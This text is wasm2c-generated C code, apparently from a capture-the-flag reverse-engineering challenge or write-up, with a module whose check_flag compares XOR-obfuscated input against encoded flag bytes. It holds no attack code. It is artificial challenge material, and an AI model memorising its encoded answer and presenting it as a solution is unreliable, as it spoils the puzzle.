I64_ROTR(x, y) ROTR(x, y, 63) #define FMIN(x, y) \\ ((UNLIKELY((x) != (x))) \\ ? NAN \\ : (UNLIKELY((y) != (y))) \\ ? NAN \\ : (UNLIKELY((x) == 0 \u0026amp;\u0026amp; (y) == 0)) ? (signbit(x) ? x : y) \\ : (x \u0026lt; y) ? x : y) #define FMAX(x, y) \\ ((UNLIKELY((x) != (x))) \\ ? NAN \\ : (UNLIKELY((y) != (y))) \\ ? NAN \\ : (UNLIKELY((x) == 0 \u0026amp;\u0026amp; (y) == 0)) ? (signbit(x) ? y : x) \\ : (x \u0026gt; y) ? x : y) #define TRUNC_S(ut, st, ft, min, minop, max, x) \\ ((UNLIKELY((x) != (x))) \\ ? TRAP(INVALID_CONVERSION) \\ : (UNLIKELY(!((x)minop(min) \u0026amp;\u0026amp; (x) \u0026lt; (max)))) ? TRAP(INT_OVERFLOW) \\ : (ut)(st)(x)) #define I32_TRUNC_S_F32(x) \\ TRUNC_S(u32, s32, f32, (f32)INT32_MIN, \u0026gt;=, 2147483648.f, x) #define I64_TRUNC_S_F32(x) \\ TRUNC_S(u64, s64, f32, (f32)INT64_MIN, \u0026gt;=, (f32)INT64_MAX, x) #define I32_TRUNC_S_F64(x) \\ TRUNC_S(u32, s32, f64, -2147483649., \u0026gt;, 2147483648., x) #define I64_TRUNC_S_F64(x) \\ TRUNC_S(u64, s64, f64, (f64)INT64_MIN, \u0026gt;=, (f64)INT64_MAX, x) #define TRUNC_U(ut, ft, max, x) \\ ((UNLIKELY((x) != (x))) \\ ? TRAP(INVALID_CONVERSION) \\ : (UNLIKELY(!((x) \u0026gt; (ft)-1 \u0026amp;\u0026amp; (x) \u0026lt; (max)))) ? TRAP(INT_OVERFLOW) \\ : (ut)(x)) #define I32_TRUNC_U_F32(x) TRUNC_U(u32, f32, 4294967296.f, x) #define I64_TRUNC_U_F32(x) TRUNC_U(u64, f32, (f32)UINT64_MAX, x) #define I32_TRUNC_U_F64(x) TRUNC_U(u32, f64, 4294967296., x) #define I64_TRUNC_U_F64(x) TRUNC_U(u64, f64, (f64)UINT64_MAX, x) #define TRUNC_SAT_S(ut, st, ft, min, smin, minop, max, smax, x) \\ ((UNLIKELY((x) != (x))) \\ ? 0 \\ : (UNLIKELY(!((x)minop(min)))) \\ ? smin \\ : (UNLIKELY(!((x) \u0026lt; (max)))) ? smax : (ut)(st)(x)) #define I32_TRUNC_SAT_S_F32(x) \\ TRUNC_SAT_S(u32, s32, f32, (f32)INT32_MIN, INT32_MIN, \u0026gt;=, 2147483648.f, \\ INT32_MAX, x) #define I64_TRUNC_SAT_S_F32(x) \\ TRUNC_SAT_S(u64, s64, f32, (f32)INT64_MIN, INT64_MIN, \u0026gt;=, (f32)INT64_MAX, \\ INT64_MAX, x) #define I32_TRUNC_SAT_S_F64(x) \\ TRUNC_SAT_S(u32, s32, f64, -2147483649., INT32_MIN, \u0026gt;, 2147483648., \\ INT32_MAX, x) #define I64_TRUNC_SAT_S_F64(x) \\ TRUNC_SAT_S(u64, s64, f64, (f64)INT64_MIN, INT64_MIN, \u0026gt;=, (f64)INT64_MAX, \\ INT64_MAX, x) #define TRUNC_SAT_U(ut, ft, max, smax, x) \\ ((UNLIKELY((x) != (x))) ? 0 \\ : (UNLIKELY(!((x) \u0026gt; (ft)-1))) \\ ? 0 \\ : (UNLIKELY(!((x) \u0026lt; (max)))) ? smax : (ut)(x)) #define I32_TRUNC_SAT_U_F32(x) \\ TRUNC_SAT_U(u32, f32, 4294967296.f, UINT32_MAX, x) #define I64_TRUNC_SAT_U_F32(x) \\ TRUNC_SAT_U(u64, f32, (f32)UINT64_MAX, UINT64_MAX, x) #define I32_TRUNC_SAT_U_F64(x) TRUNC_SAT_U(u32, f64, 4294967296., UINT32_MAX, x) #define I64_TRUNC_SAT_U_F64(x) \\ TRUNC_SAT_U(u64, f64, (f64)UINT64_MAX, UINT64_MAX, x) #define DEFINE_REINTERPRET(name, t1, t2) \\ static inline t2 name(t1 x) { \\ t2 result; \\ memcpy(\u0026amp;result, \u0026amp;x, sizeof(result)); \\ return result; \\ } DEFINE_REINTERPRET(f32_reinterpret_i32, u32, f32) DEFINE_REINTERPRET(i32_reinterpret_f32, f32, u32) DEFINE_REINTERPRET(f64_reinterpret_i64, u64, f64) DEFINE_REINTERPRET(i64_reinterpret_f64, f64, u64) static float quiet_nanf(float x) { uint32_t tmp; memcpy(\u0026amp;tmp, \u0026amp;x, 4); tmp |= 0x7fc00000lu; memcpy(\u0026amp;x, \u0026amp;tmp, 4); return x; } static double quiet_nan(double x) { uint64_t tmp; memcpy(\u0026amp;tmp, \u0026amp;x, 8); tmp |= 0x7ff8000000000000llu; memcpy(\u0026amp;x, \u0026amp;tmp, 8); return x; } static double wasm_quiet(double x) { if (UNLIKELY(isnan(x))) { return quiet_nan(x); } return x; } static float wasm_quietf(float x) { if (UNLIKELY(isnan(x))) { return quiet_nanf(x); } return x; } static double wasm_floor(double x) { if (UNLIKELY(isnan(x))) { return quiet_nan(x); } return floor(x); } static float wasm_floorf(float x) { if (UNLIKELY(isnan(x))) { return quiet_nanf(x); } return floorf(x); } static double wasm_ceil(double x) { if (UNLIKELY(isnan(x))) { return quiet_nan(x); } return ceil(x); } static float wasm_ceilf(float x) { if (UNLIKELY(isnan(x))) { return quiet_nanf(x); } return ceilf(x); } static double wasm_trunc(double x) { if (UNLIKELY(isnan(x))) { return quiet_nan(x); } return trunc(x); } static float wasm_truncf(float x) { if (UNLIKELY(isnan(x))) { return quiet_nanf(x); } return truncf(x); } static float wasm_nearbyintf(float x) { if (UNLIKELY(isnan(x))) { return quiet_nanf(x); } return nearbyintf(x); } static double wasm_nearbyint(double x) { if (UNLIKELY(isnan(x))) { return quiet_nan(x); } return nearbyint(x); } static float wasm_fabsf(float x) { if (UNLIKELY(isnan(x))) { uint32_t tmp; memcpy(\u0026amp;tmp, \u0026amp;x, 4); tmp = tmp \u0026amp; ~(1UL \u0026lt;\u0026lt; 31); memcpy(\u0026amp;x, \u0026amp;tmp, 4); return x; } return fabsf(x); } static double wasm_fabs(double x) { if (UNLIKELY(isnan(x))) { uint64_t tmp; memcpy(\u0026amp;tmp, \u0026amp;x, 8); tmp = tmp \u0026amp; ~(1ULL \u0026lt;\u0026lt; 63); memcpy(\u0026amp;x, \u0026amp;tmp, 8); return x; } return fabs(x); } static double wasm_sqrt(double x) { if (UNLIKELY(isnan(x))) { return quiet_nan(x); } return sqrt(x); } static float wasm_sqrtf(float x) { if (UNLIKELY(isnan(x))) { return quiet_nanf(x); } return sqrtf(x); } static inline void memory_fill(wasm_rt_memory_t* mem, u32 d, u32 val, u32 n) { RANGE_CHECK(mem, d, n); memset(mem-\u0026gt;data + d, val, n); } static inline void memory_copy(wasm_rt_memory_t* dest, const wasm_rt_memory_t* src, u32 dest_addr, u32 src_addr, u32 n) { RANGE_CHECK(dest, dest_addr, n); RANGE_CHECK(src, src_addr, n); memmove(dest-\u0026gt;data + dest_addr, src-\u0026gt;data + src_addr, n); } static inline void memory_init(wasm_rt_memory_t* dest, const u8* src, u32 src_size, u32 dest_addr, u32 src_addr, u32 n) { if (UNLIKELY(src_addr + (uint64_t)n \u0026gt; src_size)) TRAP(OOB); LOAD_DATA((*dest), dest_addr, src + src_addr, n); } typedef struct { wasm_rt_func_type_t type; wasm_rt_function_ptr_t func; size_t module_offset; } wasm_elem_segment_expr_t; static inline void funcref_table_init(wasm_rt_funcref_table_t* dest, const wasm_elem_segment_expr_t* src, u32 src_size, u32 dest_addr, u32 src_addr, u32 n, void* module_instance) { if (UNLIKELY(src_addr + (uint64_t)n \u0026gt; src_size)) TRAP(OOB); if (UNLIKELY(dest_addr + (uint64_t)n \u0026gt; dest-\u0026gt;size)) TRAP(OOB); for (u32 i = 0; i \u0026lt; n; i++) { const wasm_elem_segment_expr_t* src_expr = \u0026amp;src[src_addr + i]; dest-\u0026gt;data[dest_addr + i] = (wasm_rt_funcref_t){src_expr-\u0026gt;type, src_expr-\u0026gt;func, (char*)module_instance + src_expr-\u0026gt;module_offset}; } } // Currently Wasm only supports initializing externref tables with ref.null. static inline void externref_table_init(wasm_rt_externref_table_t* dest, u32 src_size, u32 dest_addr, u32 src_addr, u32 n) { if (UNLIKELY(src_addr + (uint64_t)n \u0026gt; src_size)) TRAP(OOB); if (UNLIKELY(dest_addr + (uint64_t)n \u0026gt; dest-\u0026gt;size)) TRAP(OOB); for (u32 i = 0; i \u0026lt; n; i++) { dest-\u0026gt;data[dest_addr + i] = wasm_rt_externref_null_value; } } #define DEFINE_TABLE_COPY(type) \\ static inline void type##_table_copy(wasm_rt_##type##_table_t* dest, \\ const wasm_rt_##type##_table_t* src, \\ u32 dest_addr, u32 src_addr, u32 n) { \\ if (UNLIKELY(dest_addr + (uint64_t)n \u0026gt; dest-\u0026gt;size)) \\ TRAP(OOB); \\ if (UNLIKELY(src_addr + (uint64_t)n \u0026gt; src-\u0026gt;size)) \\ TRAP(OOB); \\ \\ memmove(dest-\u0026gt;data + dest_addr, src-\u0026gt;data + src_addr, \\ n * sizeof(wasm_rt_##type##_t)); \\ } DEFINE_TABLE_COPY(funcref) DEFINE_TABLE_COPY(externref) #define DEFINE_TABLE_GET(type) \\ static inline wasm_rt_##type##_t type##_table_get( \\ const wasm_rt_##type##_table_t* table, u32 i) { \\ if (UNLIKELY(i \u0026gt;= table-\u0026gt;size)) \\ TRAP(OOB); \\ return table-\u0026gt;data[i]; \\ } DEFINE_TABLE_GET(funcref) DEFINE_TABLE_GET(externref) #define DEFINE_TABLE_SET(type) \\ static inline void type##_table_set(const wasm_rt_##type##_table_t* table, \\ u32 i, const wasm_rt_##type##_t val) { \\ if (UNLIKELY(i \u0026gt;= table-\u0026gt;size)) \\ TRAP(OOB); \\ table-\u0026gt;data[i] = val; \\ } DEFINE_TABLE_SET(funcref) DEFINE_TABLE_SET(externref) #define DEFINE_TABLE_FILL(type) \\ static inline void type##_table_fill(const wasm_rt_##type##_table_t* table, \\ u32 d, const wasm_rt_##type##_t val, \\ u32 n) { \\ if (UNLIKELY((uint64_t)d + n \u0026gt; table-\u0026gt;size)) \\ TRAP(OOB); \\ for (uint32_t i = d; i \u0026lt; d + n; i++) { \\ table-\u0026gt;data[i] = val; \\ } \\ } DEFINE_TABLE_FILL(funcref) DEFINE_TABLE_FILL(externref) #if defined(__GNUC__) || defined(__clang__) #define FUNC_TYPE_DECL_EXTERN_T(x) extern const char* const x #define FUNC_TYPE_EXTERN_T(x) const char* const x #define FUNC_TYPE_T(x) static const char* const x #else #define FUNC_TYPE_DECL_EXTERN_T(x) extern const char x[] #define FUNC_TYPE_EXTERN_T(x) const char x[] #define FUNC_TYPE_T(x) static const char x[] #endif static void w2c_qCCYI0ajpD_0x5F_wasm_call_ctors_0(w2c_qCCYI0ajpD*); static u32 w2c_qCCYI0ajpD_strcmp_0(w2c_qCCYI0ajpD*, u32, u32); static u32 w2c_qCCYI0ajpD_check_flag_0(w2c_qCCYI0ajpD*); static void w2c_qCCYI0ajpD_copy_char_0(w2c_qCCYI0ajpD*, u32, u32); FUNC_TYPE_T(w2c_qCCYI0ajpD_t0) = \u0026#34;\\x36\\xa9\\xe7\\xf1\\xc9\\x5b\\x82\\xff\\xb9\\x97\\x43\\xe0\\xc5\\xc4\\xce\\x95\\xd8\\x3c\\x9a\\x43\\x0a\\xac\\x59\\xf8\\x4e\\xf3\\xcb\\xfa\\xb6\\x14\\x50\\x68\u0026#34;; FUNC_TYPE_T(w2c_qCCYI0ajpD_t1) = \u0026#34;\\x92\\xfb\\x6a\\xdf\\x49\\x07\\x0a\\x83\\xbe\\x08\\x02\\x68\\xcd\\xf6\\x95\\x27\\x4a\\xc2\\xf3\\xe5\\xe4\\x7d\\x29\\x49\\xe8\\xed\\x42\\x92\\x6a\\x9d\\xda\\xf0\u0026#34;; FUNC_TYPE_T(w2c_qCCYI0ajpD_t2) = \u0026#34;\\x72\\xab\\x00\\xdf\\x20\\x3d\\xce\\xa1\\xf2\\x29\\xc7\\x9d\\x13\\x40\\x7e\\x98\\xac\\x7d\\x41\\x4a\\x53\\x2e\\x42\\x42\\x61\\x55\\x2e\\xaa\\xeb\\xbe\\xc6\\x35\u0026#34;; FUNC_TYPE_T(w2c_qCCYI0ajpD_t3) = \u0026#34;\\x26\\x10\\x81\\xe2\\x21\\x43\\xd6\\x01\\x3e\\x2d\\x2f\\x16\\x17\\x78\\x6f\\xba\\xb3\\x2f\\x4d\\x54\\x9b\\x8a\\xa9\\xdd\\xbf\\x53\\x92\\x3c\\xd3\\x71\\xc6\\xb2\u0026#34;; static void init_globals(w2c_qCCYI0ajpD* instance) { instance-\u0026gt;w2c_g0 = 66864u; instance-\u0026gt;w2c_input = 1072u; instance-\u0026gt;w2c_key = 1067u; instance-\u0026gt;w2c_0x5F_dso_handle = 1024u; instance-\u0026gt;w2c_0x5F_data_end = 1328u; instance-\u0026gt;w2c_0x5F_global_base = 1024u; instance-\u0026gt;w2c_0x5F_heap_base = 66864u; instance-\u0026gt;w2c_0x5F_memory_base = 0u; instance-\u0026gt;w2c_0x5F_table_base = 1u; } static const u8 data_segment_data_w2c_qCCYI0ajpD_d0[] = { 0x9d, 0x6e, 0x93, 0xc8, 0xb2, 0xb9, 0x41, 0x8b, 0xc2, 0x97, 0xd4, 0x66, 0xc7, 0x93, 0xc4, 0xd4, 0x61, 0xc2, 0xc6, 0xc9, 0xdd, 0x62, 0x94, 0x9e, 0xc2, 0x89, 0x32, 0x91, 0x90, 0xc1, 0xdd, 0x33, 0x91, 0x91, 0x97, 0x8b, 0x64, 0xc1, 0x92, 0xc4, 0x90, 0x00, 0x00, }; static const u8 data_segment_data_w2c_qCCYI0ajpD_d1[] = { 0xf1, 0xa7, 0xf0, 0x07, 0xed, }; static void init_memories(w2c_qCCYI0ajpD* instance) { wasm_rt_allocate_memory(\u0026amp;instance-\u0026gt;w2c_memory, 2, 65536, 0); LOAD_DATA(instance-\u0026gt;w2c_memory, 1024u, data_segment_data_w2c_qCCYI0ajpD_d0, 43); LOAD_DATA(instance-\u0026gt;w2c_memory, 1067u, data_segment_data_w2c_qCCYI0ajpD_d1, 5); } static void init_data_instances(w2c_qCCYI0ajpD *instance) { } static void init_tables(w2c_qCCYI0ajpD* instance) { wasm_rt_allocate_funcref_table(\u0026amp;instance-\u0026gt;w2c_T0, 1, 1); } /* export: \u0026#39;memory\u0026#39; */ wasm_rt_memory_t* w2c_qCCYI0ajpD_memory(w2c_qCCYI0ajpD* instance) { return \u0026amp;instance-\u0026gt;w2c_memory; } /* export: \u0026#39;__wasm_call_ctors\u0026#39; */ void w2c_qCCYI0ajpD_0x5F_wasm_call_ctors(w2c_qCCYI0ajpD* instance) { return w2c_qCCYI0ajpD_0x5F_wasm_call_ctors_0(instance); } /* export: \u0026#39;strcmp\u0026#39; */ u32 w2c_qCCYI0ajpD_strcmp(w2c_qCCYI0ajpD* instance, u32 var_p0, u32 var_p1) { return w2c_qCCYI0ajpD_strcmp_0(instance, var_p0, var_p1); } /* export: \u0026#39;check_flag\u0026#39; */ u32 w2c_qCCYI0ajpD_check_flag(w2c_qCCYI0ajpD* instance) { return w2c_qCCYI0ajpD_check_flag_0(instance); } /* export: \u0026#39;input\u0026#39; */ u32* w2c_qCCYI0ajpD_input(w2c_qCCYI0ajpD* instance) { return \u0026amp;instance-\u0026gt;w2c_input; } /* export: \u0026#39;copy_char\u0026#39; */ void w2c_qCCYI0ajpD_copy_char(w2c_qCCYI0ajpD* instance, u32 var_p0, u32 var_p1) { return w2c_qCCYI0ajpD_copy_char_0(instance, var_p0, var_p1); } /* export: \u0026#39;key\u0026#39; */ u32* w2c_qCCYI0ajpD_key(w2c_qCCYI0ajpD* instance) { return \u0026amp;instance-\u0026gt;w2c_key; } /* export: \u0026#39;__dso_handle\u0026#39; */ u32* w2c_qCCYI0ajpD_0x5F_dso_handle(w2c_qCCYI0ajpD* instance) { return \u0026amp;instance-\u0026gt;w2c_0x5F_dso_handle; } /* export: \u0026#39;__data_end\u0026#39; */ u32* w2c_qCCYI0ajpD_0x5F_data_end(w2c_qCCYI0ajpD* instance) { return \u0026amp;instance-\u0026gt;w2c_0x5F_data_end; } /* export: \u0026#39;__global_base\u0026#39; */ u32* w2c_qCCYI0ajpD_0x5F_global_base(w2c_qCCYI0ajpD* instance) { return \u0026amp;instance-\u0026gt;w2c_0x5F_global_base; } /* export: \u0026#39;__heap_base\u0026#39; */ u32* w2c_qCCYI0ajpD_0x5F_heap_base(w2c_qCCYI0ajpD* instance) { return \u0026amp;instance-\u0026gt;w2c_0x5F_heap_base; } /* export: \u0026#39;__memory_base\u0026#39; */ u32* w2c_qCCYI0ajpD_0x5F_memory_base(w2c_qCCYI0ajpD* instance) { return \u0026amp;instance-\u0026gt;w2c_0x5F_memory_base; } /* export: \u0026#39;__table_base\u0026#39; */ u32* w2c_qCCYI0ajpD_0x5F_table_base(w2c_qCCYI0ajpD* instance) { return \u0026amp;instance-\u0026gt;w2c_0x5F_table_base; } void wasm2c_qCCYI0ajpD_instantiate(w2c_qCCYI0ajpD* instance) { assert(wasm_rt_is_initialized()); init_globals(instance); init_tables(instance); init_memories(instance); init_data_instances(instance); } void wasm2c_qCCYI0ajpD_free(w2c_qCCYI0ajpD* instance) { wasm_rt_free_funcref_table(\u0026amp;instance-\u0026gt;w2c_T0); wasm_rt_free_memory(\u0026amp;instance-\u0026gt;w2c_memory); } wasm_rt_func_type_t wasm2c_qCCYI0ajpD_get_func_type(uint32_t param_count, uint32_t result_count, ...) { va_list args; if (param_count == 0 \u0026amp;\u0026amp; result_count == 0) { va_start(args, result_count); if (true) { va_end(args); return w2c_qCCYI0ajpD_t0; } va_end(args); } if (param_count == 2 \u0026amp;\u0026amp; result_count == 1) { va_start(args, result_count); if (true \u0026amp;\u0026amp; va_arg(args, wasm_rt_type_t) == WASM_RT_I32 \u0026amp;\u0026amp; va_arg(args, wasm_rt_type_t) == WASM_RT_I32 \u0026amp;\u0026amp; va_arg(args, wasm_rt_type_t) == WASM_RT_I32) { va_end(args); return w2c_qCCYI0ajpD_t1; } va_end(args); } if (param_count == 0 \u0026amp;\u0026amp; result_count == 1) { va_start(args, result_count); if (true \u0026amp;\u0026amp; va_arg(args, wasm_rt_type_t) == WASM_RT_I32) { va_end(args); return w2c_qCCYI0ajpD_t2; } va_end(args); } if (param_count == 2 \u0026amp;\u0026amp; result_count == 0) { va_start(args, result_count); if (true \u0026amp;\u0026amp; va_arg(args, wasm_rt_type_t) == WASM_RT_I32 \u0026amp;\u0026amp; va_arg(args, wasm_rt_type_t) == WASM_RT_I32) { va_end(args); return w2c_qCCYI0ajpD_t3; } va_end(args); } return NULL; } void w2c_qCCYI0ajpD_0x5F_wasm_call_ctors_0(w2c_qCCYI0ajpD* instance) { FUNC_PROLOGUE; FUNC_EPILOGUE; } u32 w2c_qCCYI0ajpD_strcmp_0(w2c_qCCYI0ajpD* instance, u32 var_p0, u32 var_p1) { u32 var_l2 = 0, var_l3 = 0, var_l4 = 0, var_l5 = 0, var_l6 = 0, var_l7 = 0, var_l8 = 0, var_l9 = 0, var_l10 = 0, var_l11 = 0, var_l12 = 0, var_l13 = 0, var_l14 = 0, var_l15 = 0, var_l16 = 0, var_l17 = 0, var_l18 = 0, var_l19 = 0, var_l20 = 0, var_l21 = 0, var_l22 = 0, var_l23 = 0, var_l24 = 0, var_l25 = 0, var_l26 = 0, var_l27 = 0, var_l28 = 0, var_l29 = 0, var_l30 = 0, var_l31 = 0, var_l32 = 0, var_l33 = 0, var_l34 = 0, var_l35 = 0, var_l36 = 0, var_l37 = 0, var_l38 = 0, var_l39 = 0, var_l40 = 0, var_l41 = 0, var_l42 = 0, var_l43 = 0; FUNC_PROLOGUE; u32 var_i0, var_i1; var_i0 = instance-\u0026gt;w2c_g0; var_l2 = var_i0; var_i0 = 32u; var_l3 = var_i0; var_i0 = var_l2; var_i1 = var_l3; var_i0 -= var_i1; var_l4 = var_i0; var_i0 = var_l4; var_i1 = var_p0; i32_store(\u0026amp;instance-\u0026gt;w2c_memory, (u64)(var_i0) + 24, var_i1); var_i0 = var_l4; var_i1 = var_p1; i32_store(\u0026amp;instance-\u0026gt;w2c_memory, (u64)(var_i0) + 20, var_i1); var_i0 = var_l4; var_i0 = i32_load(\u0026amp;instance-\u0026gt;w2c_memory, (u64)(var_i0) + 24u); var_l5 = var_i0; var_i0 = var_l4; var_i1 = var_l5; i32_store(\u0026amp;instance-\u0026gt;w2c_memory, (u64)(var_i0) + 16, var_i1); var_i0 = var_l4; var_i0 = i32_load(\u0026amp;instance-\u0026gt;w2c_memory, (u64)(var_i0) + 20u); var_l6 = var_i0; var_i0 = var_l4; var_i1 = var_l6; i32_store(\u0026amp;instance-\u0026gt;w2c_memory, (u64)(var_i0) + 12, var_i1); var_L1: var_i0 = var_l4; var_i0 = i32_load(\u0026amp;instance-\u0026gt;w2c_memory, (u64)(var_i0) + 16u); var_l7 = var_i0; var_i0 = 1u; var_l8 = var_i0; var_i0 = var_l7; var_i1 = var_l8; var_i0 += var_i1; var_l9 = var_i0; var_i0 = var_l4; var_i1 = var_l9; i32_store(\u0026amp;instance-\u0026gt;w2c_memory, (u64)(var_i0) + 16, var_i1); var_i0 = var_l7; var_i0 = i32_load8_u(\u0026amp;instance-\u0026gt;w2c_memory, (u64)(var_i0)); var_l10 = var_i0; var_i0 = var_l4; var_i1 = var_l10; i32_store8(\u0026amp;instance-\u0026gt;w2c_memory, (u64)(var_i0) + 11, var_i1); var_i0 = var_l4; var_i0 = i32_load(\u0026amp;instance-\u0026gt;w2c_memory, (u64)(var_i0) + 12u); var_l11 = var_i0; var_i0 = 1u; var_l12 = var_i0; var_i0 = var_l11; var_i1 = var_l12; var_i0 += var_i1; var_l13 = var_i0; var_i0 = var_l4; var_i1 = var_l13; i32_store(\u0026amp;instance-\u0026gt;w2c_memory, (u64)(var_i0) + 12, var_i1); var_i0 = var_l11; var_i0 = i32_load8_u(\u0026amp;instance-\u0026gt;w2c_memory, (u64)(var_i0)); var_l14 = var_i0; var_i0 = var_l4; var_i1 = var_l14; i32_store8(\u0026amp;instance-\u0026gt;w2c_memory, (u64)(var_i0) + 10, var_i1); var_i0 = var_l4; var_i0 = i32_load8_u(\u0026amp;instance-\u0026gt;w2c_memory, (u64)(var_i0) + 11u); var_l15 = var_i0; var_i0 = 255u; var_l16 = var_i0; var_i0 = var_l15; var_i1 = var_l16; var_i0 \u0026amp;= var_i1; var_l17 = var_i0; var_i0 = var_l17; if (var_i0) {goto var_B2;} var_i0 = var_l4; var_i0 = i32_load8_u(\u0026amp;instance-\u0026gt;w2c_memory, (u64)(var_i0) + 11u); var_l18 = var_i0; var_i0 = 255u; var_l19 = var_i0; var_i0 = var_l18; var_i1 = var_l19; var_i0 \u0026amp;= var_i1; var_l20 = var_i0; var_i0 = var_l4; var_i0 = i32_load8_u(\u0026amp;instance-\u0026gt;w2c_memory, (u64)(var_i0) + 10u); var_l21 = var_i0; var_i0 = 255u; var_l22 = var_i0; var_i0 = var_l21; var_i1 = var_l22; var_i0 \u0026amp;= var_i1; var_l23 = var_i0; var_i0 = var_l20; var_i1 = var_l23; var_i0 -= var_i1; var_l24 = var_i0; var_i0 = var_l4; var_i1 = var_l24; i32_store(\u0026amp;instance-\u0026gt;w2c_memory, (u64)(var_i0) + 28, var_i1); goto var_B0; var_B2:; var_i0 = var_l4; var_i0 = i32_load8_u(\u0026amp;instance-\u0026gt;w2c_memory, (u64)(var_i0) + 11u); var_l25 = var_i0; var_i0 = 255u; var_l26 = var_i0; var_i0 = var_l25; var_i1 = var_l26; var_i0 \u0026amp;= var_i1; var_l27 = var_i0; var_i0 = var_l4; var_i0 = i32_load8_u(\u0026amp;instance-\u0026gt;w2c_memory, (u64)(var_i0) + 10u); var_l28 = var_i0; var_i0 = 255u; var_l29 = var_i0; var_i0 = var_l28; var_i1 = var_l29; var_i0 \u0026amp;= var_i1; var_l30 = var_i0; var_i0 = var_l27; var_l31 = var_i0; var_i0 = var_l30; var_l32 = var_i0; var_i0 = var_l31; var_i1 = var_l32; var_i0 = var_i0 == var_i1; var_l33 = var_i0; var_i0 = 1u; var_l34 = var_i0; var_i0 = var_l33; var_i1 = var_l34; var_i0 \u0026amp;= var_i1; var_l35 = var_i0; var_i0 = var_l35; if (var_i0) {goto var_L1;} var_i0 = var_l4; var_i0 = i32_load8_u(\u0026amp;instance-\u0026gt;w2c_memory, (u64)(var_i0) + 11u); var_l36 = var_i0; var_i0 = 255u; var_l37 = var_i0; var_i0 = var_l36; var_i1 = var_l37; var_i0 \u0026amp;= var_i1; var_l38 = var_i0; var_i0 = var_l4; var_i0 = i32_load8_u(\u0026amp;instance-\u0026gt;w2c_memory, (u64)(var_i0) + 10u); var_l39 = var_i0; var_i0 = 255u; var_l40 = var_i0; var_i0 = var_l39; var_i1 = var_l40; var_i0 \u0026amp;= var_i1; var_l41 = var_i0; var_i0 = var_l38; var_i1 = var_l41; var_i0 -= var_i1; var_l42 = var_i0; var_i0 = var_l4; var_i1 = var_l42; i32_store(\u0026amp;instance-\u0026gt;w2c_memory, (u64)(var_i0) + 28, var_i1); var_B0:; var_i0 = var_l4; var_i0 = i32_load(\u0026amp;instance-\u0026gt;w2c_memory, (u64)(var_i0) + 28u); var_l43 = var_i0; var_i0 = var_l43; goto var_Bfunc; var_Bfunc:; FUNC_EPILOGUE; return var_i0; } u32 w2c_qCCYI0ajpD_check_flag_0(w2c_qCCYI0ajpD* instance) { u32 var_l0 = 0, var_l1 = 0, var_l2 = 0, var_l3 = 0, var_l4 = 0, var_l5 = 0, var_l6 = 0, var_l7 = 0, var_l8 = 0, var_l9 = 0, var_l10 = 0; FUNC_PROLOGUE; u32 var_i0, var_i1; var_i0 = 0u; var_l0 = var_i0; var_i0 = 1072u; var_l1 = var_i0; var_i0 = 1024u; var_l2 = var_i0; var_i0 = var_l2; var_i1 = var_l1; var_i0 = w2c_qCCYI0ajpD_strcmp_0(instance, var_i0, var_i1); // var_i0 == 1024 / var_i1 == 1072 var_l3 = var_i0; var_i0 = var_l3; var_l4 = var_i0; var_i0 = var_l0; var_l5 = var_i0; var_i0 = var_l4; var_i1 = var_l5; var_i0 = var_i0 != var_i1; var_l6 = var_i0; var_i0 = 4294967295u; var_l7 = var_i0; var_i0 = var_l6; var_i1 = var_l7; var_i0 ^= var_i1; var_l8 = var_i0; var_i0 = 1u; var_l9 = var_i0; var_i0 = var_l8; var_i1 = var_l9; var_i0 \u0026amp;= var_i1; var_l10 = var_i0; var_i0 = var_l10; goto var_Bfunc; var_Bfunc:; FUNC_EPILOGUE; return var_i0; } void w2c_qCCYI0ajpD_copy_char_0(w2c_qCCYI0ajpD* instance, u32 var_p0, u32 var_p1) { u32 var_l2 = 0, var_l3 = 0, var_l4 = 0, var_l5 = 0, var_l6 = 0, var_l7 = 0, var_l8 = 0, var_l9 = 0, var_l10 = 0, var_l11 = 0, var_l12 = 0, var_l13 = 0, var_l14 = 0, var_l15 = 0, var_l16 = 0, var_l17 = 0, var_l18 = 0; FUNC_PROLOGUE; u32 var_i0, var_i1; var_i0 = instance-\u0026gt;w2c_g0; var_l2 = var_i0; var_i0 = 16u; var_l3 = var_i0; var_i0 = var_l2; var_i1 = var_l3; var_i0 -= var_i1; var_l4 = var_i0; var_i0 = var_l4; var_i1 = var_p0; i32_store(\u0026amp;instance-\u0026gt;w2c_memory, (u64)(var_i0) + 12, var_i1); var_i0 = var_l4; var_i1 = var_p1; i32_store(\u0026amp;instance-\u0026gt;w2c_memory, (u64)(var_i0) + 8, var_i1); var_i0 = var_l4; var_i0 = i32_load(\u0026amp;instance-\u0026gt;w2c_memory, (u64)(var_i0) + 12u); var_l5 = var_i0; var_i0 = var_l5; var_i0 = !(var_i0); if (var_i0) {goto var_B0;} var_i0 = 4u; var_l6 = var_i0; var_i0 = var_l4; var_i0 = i32_load(\u0026amp;instance-\u0026gt;w2c_memory, (u64)(var_i0) + 8u); var_l7 = var_i0; var_i0 = 5u; var_l8 = var_i0; var_i0 = var_l7; var_i1 = var_l8; var_i0 = I32_REM_S(var_i0, var_i1); var_l9 = var_i0; var_i0 = var_l6; var_i1 = var_l9; var_i0 -= var_i1; var_l10 = var_i0; var_i0 = var_l10; var_i0 = i32_load8_u(\u0026amp;instance-\u0026gt;w2c_memory, (u64)(var_i0) + 1067u); var_l11 = var_i0; var_i0 = 24u; var_l12 = var_i0; var_i0 = var_l11; var_i1 = var_l12; var_i0 \u0026lt;\u0026lt;= (var_i1 \u0026amp; 31); var_l13 = var_i0; var_i0 = var_l13; var_i1 = var_l12; var_i0 = (u32)((s32)var_i0 \u0026gt;\u0026gt; (var_i1 \u0026amp; 31)); var_l14 = var_i0; var_i0 = var_l4; var_i0 = i32_load(\u0026amp;instance-\u0026gt;w2c_memory, (u64)(var_i0) + 12u); var_l15 = var_i0; var_i0 = var_l15; var_i1 = var_l14; var_i0 ^= var_i1; var_l16 = var_i0; var_i0 = var_l4; var_i1 = var_l16; i32_store(\u0026amp;instance-\u0026gt;w2c_memory, (u64)(var_i0) + 12, var_i1); var_B0:; var_i0 = var_l4; var_i0 = i32_load(\u0026amp;instance-\u0026gt;w2c_memory, (u64)(var_i0) + 12u); var_l17 = var_i0; var_i0 = var_l4; var_i0 = i32_load(\u0026amp;instance-\u0026gt;w2c_memory, (u64)(var_i0) + 8u); var_l18 = var_i0; var_i0 = var_l18; var_i1 = var_l17; i32_store8(\u0026amp;instance-\u0026gt;w2c_memory, (u64)(var_i0) + 1072, var_i1); goto var_Bfunc; var_Bfunc:; FUNC_EPILOGUE; } :::\nRecon # 